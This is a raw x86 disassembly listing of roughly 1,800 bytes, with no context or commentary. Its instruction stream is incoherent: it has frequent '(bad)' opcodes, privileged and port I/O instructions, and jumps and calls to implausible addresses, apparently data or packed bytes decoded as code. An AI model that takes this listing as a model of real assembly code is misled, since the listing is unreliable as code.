  40e77f:	add    BYTE PTR [edi+0x12a26e3d],al
  40e785:	dec    edi
  40e786:	idiv   al
  40e788:	loopne 0x40e78a
  40e78a:	push   ds
  40e78b:	cmp    DWORD PTR [eax+0x70],eax
  40e78e:	cmp    BYTE PTR [ecx-0x77],cl
  40e791:	mov    cl,0x2f
  40e793:	lods   al,BYTE PTR ds:[esi]
  40e794:	imul   bh
  40e796:	mov    esp,DWORD PTR [ecx+0x57]
  40e799:	sbb    eax,0x58a927af
  40e79e:	add    eax,DWORD PTR [edi]
  40e7a0:	lea    eax,[eax]
  40e7a2:	outs   dx,BYTE PTR ds:[esi]
  40e7a3:	mov    ss,WORD PTR [esi+0x41d84817]
  40e7a9:	push   edx
  40e7aa:	outs   dx,DWORD PTR ds:[esi]
  40e7ab:	or     esi,DWORD PTR [esi+0x1b]
  40e7ae:	inc    eax
  40e7af:	pop    edx
  40e7b0:	in     al,dx
  40e7b1:	inc    esp
  40e7b2:	div    DWORD PTR [ecx]
  40e7b4:	fisttp DWORD PTR [eax+0x5ff50197]
  40e7ba:	jp     0x40e7e5
  40e7bc:	shr    eax,0x6e
  40e7bf:	adc    esi,esi
  40e7c1:	ds jbe 0x40e778
  40e7c4:	aas    
  40e7c5:	mov    edi,0x30974ed7
  40e7ca:	sbb    ebp,DWORD PTR [edx]
  40e7cc:	mov    al,0x2d
  40e7ce:	push   eax
  40e7cf:	cdq    
  40e7d0:	sbb    cl,dl
  40e7d2:	xchg   ecx,eax
  40e7d3:	loopne 0x40e81b
  40e7d5:	add    ch,BYTE PTR [esi+0x7f]
  40e7d8:	call   0xbe7bdce1
  40e7dd:	inc    edx
  40e7de:	inc    esp
  40e7df:	cmp    eax,esp
  40e7e1:	xchg   edx,eax
  40e7e2:	dec    edi
  40e7e3:	adc    BYTE PTR [edi+0xc],dl
  40e7e6:	add    eax,0xa5f1ec28
  40e7eb:	sti    
  40e7ec:	inc    ecx
  40e7ed:	test   BYTE PTR es:[eax+0x11],al
  40e7f1:	inc    esi
  40e7f2:	dec    ebx
  40e7f3:	or     DWORD PTR [ecx+ebx*1],esi
  40e7f6:	clc    
  40e7f7:	dec    ebx
  40e7f8:	ss ss push 0x43
  40e7fc:	sub    al,0xdc
  40e7fe:	cs inc edx
  40e800:	jbe    0x40e83d
  40e802:	inc    eax
  40e803:	loope  0x40e815
  40e805:	pop    ds
  40e806:	(bad)  
  40e807:	gs gs js 0x40e830
  40e80b:	std    
  40e80c:	cmc    
  40e80d:	std    
  40e80e:	mov    edi,0x83369584
  40e813:	imul   esp,DWORD PTR [eax+edi*1],0xffffff90
  40e817:	mov    eax,ds:0x3bedf6f2
  40e81c:	les    ebx,FWORD PTR [ebp+0x5313646f]
  40e822:	iret   
  40e823:	fwait
  40e824:	xlat   BYTE PTR ds:[ebx]
  40e825:	mov    bl,0x8f
  40e827:	add    ch,BYTE PTR [ecx-0x6ab4c8bd]
  40e82d:	cmp    eax,eax
  40e82f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e830:	jg     0x40e819
  40e832:	loop   0x40e806
  40e834:	mov    edx,0xe80b5837
  40e839:	lea    ecx,[ecx+ebp*4-0x4fa347b8]
  40e840:	aad    0xfc
  40e842:	and    bl,ch
  40e844:	mov    al,ds:0xb0441af
  40e849:	int    0xef
  40e84b:	lds    eax,FWORD PTR [ebx*2+0x2e13c141]
  40e852:	scas   eax,DWORD PTR es:[edi]
  40e853:	dec    ecx
  40e854:	mov    ah,0xb3
  40e856:	imul   ebp,DWORD PTR [ebp-0x7d],0xb630891a
  40e85d:	inc    ebx
  40e85e:	fs xor al,0x7a
  40e861:	cmp    BYTE PTR [edx+0x6274d51a],bl
  40e867:	(bad)  [ecx]
  40e869:	jl     0x40e8c8
  40e86b:	jecxz  0x40e881
  40e86d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e86e:	jg     0x40e8e6
  40e870:	jne    0x40e860
  40e872:	inc    ebx
  40e873:	dec    edi
  40e874:	sub    eax,0xc3395f54
  40e879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e87a:	inc    esp
  40e87b:	jle    0x40e8a6
  40e87d:	fs add eax,ecx
  40e880:	cmc    
  40e881:	or     al,BYTE PTR [ebp-0x3e]
  40e884:	ret    0x6d50
  40e887:	or     edx,DWORD PTR [esi+eiz*8]
  40e88a:	icebp  
  40e88b:	div    ebp
  40e88d:	(bad)  
  40e88e:	sbb    bh,BYTE PTR [eax]
  40e890:	xcrypt-cbc (bad)
  40e891:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e892:	aam    0x2a
  40e894:	cmc    
  40e895:	call   0xc97e:0x93d2f73e
  40e89c:	aas    
  40e89d:	cmp    BYTE PTR [ebx+edi*4-0x5e],bl
  40e8a1:	rcl    BYTE PTR [eax],cl
  40e8a3:	icebp  
  40e8a4:	call   0xba8d8c27
  40e8a9:	mov    ebx,0x35799d07
  40e8ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8af:	hlt    
  40e8b0:	sar    BYTE PTR [ebx],1
  40e8b2:	sbb    BYTE PTR [ecx-0xcb02c35],dh
  40e8b8:	sub    al,0xe5
  40e8ba:	jns    0x40e913
  40e8bc:	push   ds
  40e8bd:	call   0x228bac30
  40e8c2:	and    esi,DWORD PTR ds:0x7a6a57d
  40e8c8:	and    eax,ebx
  40e8ca:	sub    al,0xfe
  40e8cc:	cmc    
  40e8cd:	dec    edx
  40e8ce:	inc    ebp
  40e8cf:	dec    esi
  40e8d0:	and    BYTE PTR [edi+0x1de7c491],dl
  40e8d6:	retf   0xf5e7
  40e8d9:	push   ss
  40e8da:	or     edi,DWORD PTR [esi+edi*2-0x4dd7e09f]
  40e8e1:	jne    0x40e8b0
  40e8e3:	jmp    0x40e87a
  40e8e5:	aaa    
  40e8e6:	or     eax,0x6e1b09fa
  40e8eb:	jp     0x40e877
  40e8ed:	inc    ebx
  40e8ee:	lds    ebx,FWORD PTR [eax-0x28306931]
  40e8f4:	int    0x57
  40e8f6:	outs   dx,DWORD PTR ds:[esi]
  40e8f7:	push   ebp
  40e8f8:	inc    esp
  40e8f9:	pop    ss
  40e8fa:	loop   0x40e8e6
  40e8fc:	inc    ebp
  40e8fd:	or     al,0x6e
  40e8ff:	fs jne 0x40e965
  40e902:	idiv   DWORD PTR [ecx+0x5d]
  40e905:	push   ds
  40e906:	stc    
  40e907:	cmp    BYTE PTR [edx],bl
  40e909:	sbb    BYTE PTR ss:[bx],dh
  40e90d:	imul   ebp,DWORD PTR [eax+ebx*1+0x3adcefec],0xfffffff1
  40e915:	xchg   esi,ebx
  40e917:	add    BYTE PTR [ebx],ah
  40e919:	(bad)  
  40e91a:	mov    esi,0x9dd01a38
  40e91f:	adc    ecx,0x12ad7958
  40e925:	addr16 push ecx
  40e927:	pop    esp
  40e928:	outs   dx,BYTE PTR ds:[esi]
  40e929:	imul   edx,DWORD PTR [ebp-0x73155148],0xb2312959
  40e933:	test   al,0x4d
  40e935:	jg     0x40e989
  40e937:	sub    DWORD PTR [ebx],eax
  40e939:	out    dx,al
  40e93a:	(bad)
  40e93d:	stos   BYTE PTR es:[edi],al
  40e93e:	xor    dh,dl
  40e940:	enter  0xdd8a,0x81
  40e944:	push   0x462e2109
  40e949:	mov    ah,0xee
  40e94b:	xchg   dl,cl
  40e94d:	pop    ds
  40e94e:	inc    edi
  40e94f:	out    0xfd,eax
  40e951:	jnp    0x40e9c2
  40e953:	or     edx,DWORD PTR [ecx+0x7c]
  40e956:	ins    DWORD PTR es:[edi],dx
  40e957:	out    0x10,al
  40e959:	cld    
  40e95a:	mov    ds:0x5f37e38,eax
  40e95f:	sbb    ebp,eax
  40e961:	mov    edi,ecx
  40e963:	inc    eax
  40e964:	cmc    
  40e965:	scas   eax,DWORD PTR es:[edi]
  40e966:	loope  0x40e9e5
  40e968:	enter  0xb973,0xf5
  40e96c:	imul   esi,DWORD PTR [ecx],0xfffffffd
  40e96f:	mov    BYTE PTR gs:[ecx-0x23eb36cf],bh
  40e976:	arpl   sp,ax
  40e978:	test   eax,0x6ac4b4af
  40e97e:	xchg   ecx,eax
  40e97f:	pop    eax
  40e980:	(bad)  
  40e981:	mov    esi,0xc7042583
  40e986:	inc    eax
  40e987:	stc    
  40e988:	in     eax,0x90
  40e98a:	shl    edx,0x94
  40e98d:	fdiv   DWORD PTR [ecx+0x1e]
  40e990:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e991:	daa    
  40e992:	push   0x2d29e7b8
  40e997:	push   es
  40e998:	ret    
  40e999:	xor    al,0x33
  40e99b:	adc    eax,0xb7eee07f
  40e9a0:	outs   dx,DWORD PTR ds:[esi]
  40e9a1:	leave  
  40e9a2:	loope  0x40e98d
  40e9a4:	call   0x25d7453b
  40e9a9:	dec    eax
  40e9aa:	mov    dl,0x89
  40e9ac:	clc    
  40e9ad:	call   FWORD PTR [esi+0x55]
  40e9b0:	and    edi,DWORD PTR ds:0x64859b4f
  40e9b6:	leave  
  40e9b7:	mov    ah,0x8d
  40e9b9:	push   ss
  40e9ba:	jnp    0x40e98f
  40e9bc:	xor    al,0x73
  40e9be:	or     edi,DWORD PTR [ecx+0x7d488909]
  40e9c4:	aad    0xdf
  40e9c6:	fild   DWORD PTR [ebx+eax*4]
  40e9c9:	or     eax,0x2c05896e
  40e9ce:	fwait
  40e9cf:	jmp    0xd2afb752
  40e9d4:	loope  0x40ea03
  40e9d6:	mov    esp,0xef8d2868
  40e9db:	cmp    BYTE PTR [esp+edi*2+0x3e1a676b],dl
  40e9e2:	adc    eax,0xd289f54e
  40e9e7:	push   edx
  40e9e8:	mov    eax,0x6f0e7622
  40e9ed:	and    al,0xbb
  40e9ef:	cmp    DWORD PTR [edx-0x3192aa17],eax
  40e9f5:	aad    0x16
  40e9f7:	inc    esi
  40e9f8:	jno    0x40e9e2
  40e9fa:	push   ss
  40e9fb:	ja     0x40e9f2
  40e9fd:	xor    eax,0xb58c0e39
  40ea02:	mov    eax,0xd38ec72
  40ea07:	stc    
  40ea08:	retf   
  40ea09:	jg     0x40e9c7
  40ea0b:	ja     0x40ea41
  40ea0d:	popa   
  40ea0e:	push   0xd0dfe9f1
  40ea13:	aas    
  40ea14:	add    eax,0x7b945722
  40ea19:	xor    DWORD PTR [esi],edx
  40ea1b:	(bad)  
  40ea1c:	fiadd  WORD PTR [edx+ecx*1]
  40ea1f:	cdq    
  40ea20:	pop    eax
  40ea21:	inc    eax
  40ea22:	scas   eax,DWORD PTR es:[edi]
  40ea23:	fwait
  40ea24:	jge    0x40ea60
  40ea26:	ret    0xd02c
  40ea29:	cmp    ebp,esp
  40ea2b:	jmp    FWORD PTR [edx-0x482f669f]
  40ea31:	pop    ds
  40ea32:	pop    es
  40ea33:	shl    esi,cl
  40ea35:	cmp    ch,bh
  40ea37:	js     0x40e9fa
  40ea39:	xchg   edx,eax
  40ea3a:	clc    
  40ea3b:	test   esp,esp
  40ea3d:	neg    DWORD PTR [edi+0x6f26d676]
  40ea43:	(bad)  
  40ea44:	test   ebx,0x3bf2d846
  40ea4a:	pusha  
  40ea4b:	mov    bh,0x9e
  40ea4d:	mov    edi,0xc03c87bb
  40ea52:	outs   dx,BYTE PTR ds:[esi]
  40ea53:	ins    DWORD PTR es:[edi],dx
  40ea54:	sbb    al,dl
  40ea56:	loope  0x40ea83
  40ea58:	xchg   esp,eax
  40ea59:	xchg   esp,eax
  40ea5a:	sbb    eax,0xa072c530
  40ea5f:	imul   ebp,DWORD PTR [ebx],0x866509c8
  40ea65:	lods   al,BYTE PTR ds:[esi]
  40ea66:	outs   dx,BYTE PTR ds:[esi]
  40ea67:	pop    eax
  40ea68:	push   edx
  40ea69:	xor    al,0x68
  40ea6b:	gs cld 
  40ea6d:	push   ss
  40ea6e:	lahf   
  40ea6f:	aaa    
  40ea70:	test   DWORD PTR [ecx],esi
  40ea72:	call   0xb25f:0x6099f50d
  40ea79:	lods   al,BYTE PTR ds:[esi]
  40ea7a:	outs   dx,BYTE PTR ds:[esi]
  40ea7b:	fisubr WORD PTR [ecx+0x57]
  40ea7e:	dec    edx
  40ea7f:	icebp  
  40ea80:	push   ebx
  40ea81:	xor    al,0x35
  40ea83:	and    eax,0x77a3390d
  40ea88:	scas   al,BYTE PTR es:[edi]
  40ea89:	pusha  
  40ea8a:	out    dx,eax
  40ea8b:	rcl    DWORD PTR [eax+esi*4],1
  40ea8e:	shl    ch,1
  40ea90:	cmc    
  40ea91:	mov    ebx,0x4db5560e
  40ea96:	loopne 0x40ea44
  40ea98:	mov    edi,0x17fedb3b
  40ea9d:	out    dx,eax
  40ea9e:	jnp    0x40ea93
  40eaa0:	xchg   edi,eax
  40eaa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eaa2:	imul   ebx,DWORD PTR [eax-0x80],0xf77a5ea6
  40eaa9:	adc    BYTE PTR [eax+0x3380003],0x76
  40eab0:	hlt    
  40eab1:	dec    esi
  40eab2:	dec    ebx
  40eab3:	test   BYTE PTR [ecx-0x3f],dl
  40eab6:	outs   dx,BYTE PTR ds:[esi]
  40eab7:	push   0xc1f0e70a
  40eabc:	lahf   
  40eabd:	sbb    cl,BYTE PTR [edx]
  40eabf:	cmp    eax,0xaa237530
  40eac4:	mov    ds:0x69104cb0,al
  40eac9:	mov    ebp,DWORD PTR [ecx-0x668380ea]
  40eacf:	shl    ch,cl
  40ead1:	or     BYTE PTR [edi],ah
  40ead3:	add    DWORD PTR [ebx],ecx
  40ead5:	jecxz  0x40eb0e
  40ead7:	enter  0x3bc3,0x3f
  40eadb:	arpl   WORD PTR [edi],si
  40eadd:	jge    0x40eb1f
  40eadf:	lds    esi,FWORD PTR [edi-0xc0b903f]
  40eae5:	adc    al,0xb3
  40eae7:	nop    eax
  40eaea:	push   edx
  40eaeb:	aam    0xac
  40eaed:	cmp    edi,DWORD PTR [esi]
  40eaef:	enter  0x1d18,0x54
  40eaf3:	lods   eax,DWORD PTR ds:[esi]
  40eaf4:	(bad)  
  40eaf5:	mov    ds:0x2cccc982,eax
  40eafa:	das    
  40eafb:	fnsave ds:0xa186a5e9
  40eb01:	xor    BYTE PTR [ebp+eax*2-0xfa5f5f0],dh
  40eb08:	xchg   ebx,eax
  40eb09:	cmp    esp,DWORD PTR [edx+0x1b]
  40eb0c:	adc    eax,0x5f36f70
  40eb11:	mov    ah,0x2a
  40eb13:	imul   esp,DWORD PTR [esi+esi*8],0xffffffed
  40eb17:	cmp    eax,0x9b2996d8
  40eb1c:	hlt    
  40eb1d:	cmp    bh,BYTE PTR [ecx]
  40eb1f:	fs (bad) 
  40eb22:	push   0x18
  40eb24:	mov    bl,0xa7
  40eb26:	outs   dx,BYTE PTR ds:[esi]
  40eb27:	sub    cl,BYTE PTR [edi]
  40eb29:	out    dx,al
  40eb2a:	fdiv   DWORD PTR [ecx+0xe]
  40eb2d:	aaa    
  40eb2e:	or     bh,BYTE PTR [ecx]
  40eb30:	xchg   esp,eax
  40eb31:	les    esp,FWORD PTR [eax+0x5c]
  40eb34:	push   0xffffffb2
  40eb36:	jp     0x40eb86
  40eb38:	in     al,0xf3
  40eb3a:	shl    ebp,cl
  40eb3c:	mov    ebx,DWORD PTR [ebx+0x11]
  40eb3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb40:	(bad)  
  40eb41:	and    eax,edx
  40eb43:	aas    
  40eb44:	adc    ax,0x846f
  40eb48:	pop    ss
  40eb49:	lock pop ss
  40eb4b:	sub    eax,0xc8c056cd
  40eb50:	xchg   edx,eax
  40eb51:	ja     0x40ebc2
  40eb53:	mov    bl,0x61
  40eb55:	xlat   BYTE PTR ds:[ebx]
  40eb56:	into   
  40eb57:	adc    BYTE PTR [edi-0x1d],cl
  40eb5a:	mov    esi,0x331aeb38
  40eb5f:	add    dh,BYTE PTR [ebx-0x12]
  40eb62:	cmp    esi,DWORD PTR ds:0xb9715c13
  40eb68:	cmc    
  40eb69:	pusha  
  40eb6a:	mov    cl,BYTE PTR [ebx]
  40eb6c:	add    eax,DWORD PTR [edx+0x56]
  40eb6f:	and    BYTE PTR [ebp+esi*2-0x2885c721],ah
  40eb76:	inc    ebx
  40eb77:	rol    BYTE PTR [ebp-0x4d788a3d],cl
  40eb7d:	xor    eax,0xdfa59a00
  40eb82:	sbb    ebp,ecx
  40eb84:	in     eax,dx
  40eb85:	shr    BYTE PTR [ebp+0x584cf5e2],0x9f
  40eb8c:	and    ebx,DWORD PTR [edi-0xc]
  40eb8f:	(bad)  
  40eb90:	jge    0x40ebb7
  40eb92:	outs   dx,DWORD PTR ds:[esi]
  40eb93:	jnp    0x40ebfe
  40eb95:	into   
  40eb96:	mov    BYTE PTR [ecx+0x20],0x3d
  40eb9a:	mov    bl,0x38
  40eb9c:	xor    DWORD PTR [esi-0x7eab7df3],ebx
  40eba2:	int3   
  40eba3:	fdivrp st(5),st
  40eba5:	(bad)  
  40eba6:	sbb    al,0x37
  40eba8:	in     al,0x2
  40ebaa:	push   ds
  40ebab:	and    eax,0xe49df4f6
  40ebb0:	adc    DWORD PTR ds:0xbd175aa6,edx
  40ebb6:	push   ecx
  40ebb7:	scas   eax,DWORD PTR es:[edi]
  40ebb8:	fldenv [edi+eiz*2]
  40ebbb:	frstor [ecx-0x6a059115]
  40ebc1:	mov    ah,0xe3
  40ebc3:	sub    eax,0x3c3e0e76
  40ebc8:	dec    edi
  40ebc9:	dec    esp
  40ebcb:	adc    al,0xb6
  40ebcd:	aam    0x56
  40ebcf:	ins    BYTE PTR es:[edi],dx
  40ebd0:	dec    eax
  40ebd1:	(bad)  
  40ebd2:	outs   dx,BYTE PTR ds:[esi]
  40ebd3:	push   edx
  40ebd4:	test   DWORD PTR [edi-0x571d3803],edx
  40ebda:	cdq    
  40ebdb:	cmp    BYTE PTR [ebx+0x6e7389f7],bh
  40ebe1:	pop    eax
  40ebe2:	ret    
  40ebe3:	jmp    0x40ebda
  40ebe5:	arpl   WORD PTR [edx],bp
  40ebe7:	jne    0x40ebd1
  40ebe9:	cvtpi2ps xmm6,QWORD PTR [edx-0x3da8c7bd]
  40ebf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebf1:	or     esi,edi
  40ebf3:	mov    edx,0x64e72eb6
  40ebf8:	adc    dl,BYTE PTR [ecx]
  40ebfa:	sbb    DWORD PTR [ebx-0x48036e8b],eax
  40ec00:	(bad)  
  40ec01:	sahf   
  40ec02:	push   edi
  40ec03:	test   DWORD PTR ds:[ebx-0x11],edx
  40ec07:	mov    ds:0x66943971,eax
  40ec0c:	arpl   WORD PTR [ebp+0x28],di
  40ec0f:	xor    ch,BYTE PTR [eax+ecx*1-0x5f26c8]
  40ec16:	jge    0x40ec29
  40ec18:	add    al,0xff
  40ec1a:	out    0x38,eax
  40ec1c:	mov    dh,0x97
  40ec1e:	fdiv   DWORD PTR ss:[eax]
  40ec21:	xor    DWORD PTR [ebx-0xb],eax
  40ec24:	mov    edi,0xdfe8d988
  40ec29:	lock mov dh,ch
  40ec2c:	cmc    
  40ec2d:	lock inc ebp
  40ec2f:	out    dx,eax
  40ec30:	push   eax
  40ec31:	jmp    0x40ecaa
  40ec33:	pop    edx
  40ec34:	sub    bh,BYTE PTR [eax]
  40ec36:	fistp  QWORD PTR [ecx+0x2a64b285]
  40ec3c:	fild   QWORD PTR [ebx-0x3170026]
  40ec42:	das    
  40ec43:	dec    ecx
  40ec44:	mov    esi,0x41689120
  40ec49:	dec    ecx
  40ec4a:	std    
  40ec4b:	cmp    DWORD PTR [esi-0x38],ecx
  40ec4e:	cmp    al,0xdc
  40ec50:	xor    eax,0x955c10fa
  40ec55:	inc    eax
  40ec56:	cmp    BYTE PTR [esi-0x65596382],dl
  40ec5c:	fnstsw WORD PTR [edx]
  40ec5e:	inc    ecx
  40ec5f:	adc    eax,0x357fe3
  40ec64:	std    
  40ec65:	pop    es
  40ec66:	jae    0x40eca0
  40ec68:	xchg   edi,eax
  40ec69:	add    DWORD PTR [edi],edi
  40ec6b:	cmp    dl,BYTE PTR [esi]
  40ec6d:	jne    0x40ec49
  40ec6f:	mov    edx,0xb8f19c3d
  40ec74:	adc    al,0xf2
  40ec76:	sbb    edi,DWORD PTR [ebp-0xf]
  40ec79:	push   ebp
  40ec7a:	cmp    bh,BYTE PTR [ecx]
  40ec7c:	pop    ds
  40ec7d:	(bad)  
  40ec7f:	aaa    
  40ec80:	and    BYTE PTR [ebx+0x4f],bh
  40ec83:	dec    ebp
  40ec84:	cmc    
  40ec85:	jno    0x40ec96
  40ec87:	lods   eax,DWORD PTR ds:[esi]
  40ec88:	mov    eax,0x4b3fe7d4
  40ec8d:	xor    esp,ebx
  40ec8f:	xchg   BYTE PTR [esi],cl
  40ec91:	out    dx,al
  40ec92:	or     cl,cl
  40ec94:	xlat   BYTE PTR ds:[ebx]
  40ec95:	in     eax,0xb0
  40ec97:	data16 loopne 0x40ecfd
  40ec9a:	jnp    0x40ecfe
  40ec9c:	add    bh,BYTE PTR [eax+0x704eea09]
  40eca2:	pop    ecx
  40eca3:	cmp    DWORD PTR [ebx+0x72ebc334],esp
  40eca9:	mov    ah,0xb
  40ecab:	xchg   BYTE PTR [ecx+0x49],dl
  40ecae:	imul   edi,DWORD PTR [eax],0xffffff9d
  40ecb1:	into   
  40ecb2:	push   ss
  40ecb3:	inc    esi
  40ecb4:	aad    0x97
  40ecb6:	clc    
  40ecb7:	cmp    BYTE PTR [edi],dh
  40ecb9:	adc    eax,0x45e23f35
  40ecbe:	jp     0x40ec84
  40ecc0:	cmc    
  40ecc1:	out    dx,eax
  40ecc2:	jmp    0x40ed0d
  40ecc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecc5:	fdiv   DWORD PTR [ebx]
  40ecc7:	adc    ecx,edx
  40ecc9:	xor    eax,0x6a2d9e81
  40ecce:	pusha  
  40eccf:	sub    bl,ch
  40ecd1:	mov    WORD PTR [ecx+0x78],cs
  40ecd4:	pop    ebx
  40ecd5:	jg     0x40ecee
  40ecd7:	mov    edi,0x15ee49a2
  40ecdc:	xor    esi,DWORD PTR [edx-0x7e]
  40ecdf:	sbb    edi,esp
  40ece1:	fisub  DWORD PTR [edi]
  40ece3:	cwde   
  40ece4:	stos   DWORD PTR es:[edi],eax
  40ece5:	fwait
  40ece6:	jmp    0x40ece6
  40ece8:	jae    0x40ed35
  40ecea:	das    
  40eceb:	pushf  
  40ecec:	lahf   
  40eced:	loope  0x40ecbb
  40ecef:	cmp    BYTE PTR [ecx+0x2fc5441b],ch
  40ecf5:	add    eax,0x61f55f54
  40ecfa:	retf   
  40ecfb:	adc    eax,0x4d9aad0
  40ed00:	dec    ebp
  40ed01:	cmp    eax,DWORD PTR [ebp+0x3e1a8617]
  40ed07:	loop   0x40ed16
  40ed09:	pop    eax
  40ed0a:	xor    esp,esp
  40ed0c:	cmc    
  40ed0d:	mov    edx,0x3b68333d
  40ed12:	cmp    dh,cl
  40ed14:	inc    eax
  40ed15:	pop    es
  40ed16:	pop    eax
  40ed17:	sub    DWORD PTR [ebx],edx
  40ed19:	cmp    cl,bh
  40ed1b:	sti    
  40ed1c:	or     al,0x1c
  40ed1e:	jne    0x40ed11
  40ed20:	cmp    eax,0xa7388480
  40ed25:	or     DWORD PTR [edx],edx
  40ed27:	jmp    0xc493001b
  40ed2c:	sub    cl,BYTE PTR [esi]
  40ed2e:	popa   
  40ed2f:	fistp  QWORD PTR gs:[edx]
  40ed32:	jae    0x40ecc4
  40ed34:	fs xchg edi,eax
  40ed36:	or     DWORD PTR [ebp-0x42],edx
  40ed39:	sahf   
  40ed3a:	test   ecx,eax
  40ed3c:	add    esp,DWORD PTR [edx+0x6f]
  40ed3f:	mov    ecx,0xe635f59b
  40ed44:	cmp    ah,ah
  40ed46:	xchg   ebx,eax
  40ed47:	int3   
  40ed48:	jne    0x40ecfd
  40ed4a:	push   cs
  40ed4b:	add    BYTE PTR [edx-0xa306db7],bh
  40ed51:	inc    esp
  40ed52:	jb     0x40ed37
  40ed54:	jge    0x40ed7f
  40ed56:	inc    ebp
  40ed57:	pop    ebx
  40ed58:	idiv   DWORD PTR [eax]
  40ed5a:	stos   DWORD PTR es:[edi],eax
  40ed5b:	pop    esp
  40ed5c:	cs mov bl,0x35
  40ed5f:	pop    DWORD PTR [eax-0x1adb9169]
  40ed65:	cmp    eax,0xa8707a80
  40ed6a:	jae    0x40eda5
  40ed6c:	pop    es
  40ed6d:	xchg   ecx,eax
  40ed6e:	pop    esp
  40ed6f:	rcl    BYTE PTR cs:[eax+eax*2],0x49
  40ed74:	push   cs
  40ed75:	aad    0x6e
  40ed77:	dec    esp
  40ed78:	test   eax,0x814d95c8
  40ed7d:	into   
  40ed7e:	jge    0x40edaf
  40ed80:	fcomp  st(0)
  40ed82:	popf   
  40ed83:	cmp    BYTE PTR [esi+esi*8+0x63],al
  40ed87:	push   esp
  40ed88:	push   edx
  40ed89:	jne    0x40edf0
  40ed8b:	sub    ch,al
  40ed8d:	imul   ebp,DWORD PTR [edi+esi*1+0x7092345b],0x38ae364c
  40ed98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed99:	std    
  40ed9a:	sar    DWORD PTR [esi],cl
  40ed9c:	push   eax
  40ed9d:	stos   BYTE PTR es:[edi],al
  40ed9e:	jae    0x40ed52
  40eda0:	cmc    
  40eda1:	mov    bh,0xdc
  40eda3:	lds    edx,FWORD PTR [esp+edx*4-0x6b]
  40eda7:	jne    0x40ed7d
  40eda9:	jecxz  0x40ee04
  40edab:	xor    BYTE PTR [ecx],dl
  40edad:	add    al,0xb8
  40edaf:	mov    eax,0xc7f8075a
  40edb4:	dec    edx
  40edb5:	sub    BYTE PTR [edi-0x66],ch
  40edb8:	xor    ch,al
  40edba:	xchg   edx,eax
  40edbb:	add    ch,BYTE PTR [ebx]
  40edbd:	xchg   esi,eax
  40edbe:	lea    eax,[ebp-0x23]
  40edc1:	js     0x40edfd
  40edc3:	adc    eax,0x3912956d
  40edc8:	fisubr WORD PTR [eax+0x65612e59]
  40edce:	outs   dx,DWORD PTR ds:[esi]
  40edcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edd0:	mov    al,ds:0xbc13e885
  40edd5:	push   0xffffffca
  40edd7:	add    BYTE PTR [ebp+0x45baeefb],al
  40eddd:	not    DWORD PTR [edi+0x6f2596a4]
  40ede3:	test   BYTE PTR [edx],0xfe
  40ede6:	jp     0x40eda4
  40ede8:	loope  0x40edf7
  40edea:	fstp   TBYTE PTR [eax]
  40edec:	mov    BYTE PTR [ebx],cl
  40edee:	std    
  40edef:	jbe    0x40eddb
  40edf1:	and    eax,edi
  40edf3:	outs   dx,BYTE PTR ds:[esi]
  40edf4:	adc    eax,esi
  40edf6:	sbb    eax,DWORD PTR [esi+0x75]
  40edf9:	cdq    
  40edfa:	mov    ah,0x5c
  40edfc:	lahf   
  40edfd:	out    0xe9,al
  40edff:	cmp    BYTE PTR [esi-0x124a3b4d],dh
  40ee05:	jmp    0xb49b:0xf9f54999
  40ee0c:	js     0x40edc9
  40ee0e:	imul   esi,esp,0xffffffb1
  40ee11:	pop    es
  40ee12:	std    
  40ee13:	xor    eax,0x44b47811
  40ee18:	fsubr  st,st(7)
  40ee1a:	mov    al,ds:0x1cf3f51e
  40ee1f:	repz add ah,BYTE PTR [edi+0x29]
  40ee23:	out    dx,eax
  40ee24:	test   al,0x3b
  40ee26:	jmp    0x40ee2c
  40ee28:	mov    eax,ds:0xb86bc793
  40ee2d:	aas    
  40ee2e:	outs   dx,DWORD PTR ds:[esi]
  40ee2f:	test   BYTE PTR [ebx-0x63bc4e17],bh
  40ee35:	rcr    DWORD PTR [edi-0x8],cl
  40ee38:	mov    eax,ds:0x8e393b77
  40ee3d:	sbb    dl,cl
  40ee3f:	retf   0x3dfe
  40ee42:	imul   esi,DWORD PTR [eax],0x72
  40ee45:	sbb    al,0x6e
  40ee47:	aad    0x75
  40ee49:	xacquire xchg DWORD PTR [ebx-0x26],ebx
  40ee4d:	pop    ecx
  40ee4e:	lahf   
  40ee4f:	cmp    BYTE PTR [edi+0x52],ch
  40ee52:	jle    0x40ede7
  40ee54:	(bad)  
  40ee55:	cli    
  40ee56:	push   0x2e20f5da
  40ee5b:	fnstcw WORD PTR [ebx+0x2b43ea0]
  40ee61:	cmp    BYTE PTR [edx+esi*8],dh
  40ee64:	lds    ebx,FWORD PTR [edi]
  40ee66:	mov    al,0x89
  40ee68:	push   edx
  40ee69:	or     ecx,DWORD PTR [eax-0x5b]
  40ee6c:	cmc    
  40ee6d:	bound  ebx,QWORD PTR [ecx]
  40ee6f:	jo     0x40ee09
  40ee71:	pop    eax
  40ee72:	dec    eax
  40ee73:	mov    bh,0x4
  40ee75:	cmp    esi,DWORD PTR [eax+ebx*4]
  40ee78:	push   es
  40ee79:	test   BYTE PTR [ebx-0x42],0xe7
  40ee7d:	js     0x40eea8
  40ee7f:	dec    ebp
  40ee80:	jae    0x40ee81
  40ee82:	outs   dx,BYTE PTR ds:[esi]
  40ee83:	jge    0x40ee6f
  40ee85:	sub    BYTE PTR [ebp-0x7c],dl
  40ee88:	xor    eax,0x613938dc
  40ee8d:	xchg   ebx,eax
  40ee8e:	xchg   esi,eax
  40ee8f:	ret    
  40ee90:	icebp  
  40ee91:	leave  
  40ee92:	icebp  
  40ee93:	mov    ecx,0x46fb70f5
  40ee98:	pop    edx
  40ee99:	adc    DWORD PTR [eax+0x1b],0x57903802
  40eea0:	retf   
  40eea1:	ficomp DWORD PTR [ebp+0x6ea62879]
  40eea7:	jecxz  0x40ee9b
  40eea9:	mov    edx,0x3823827
  40eeae:	inc    ebp
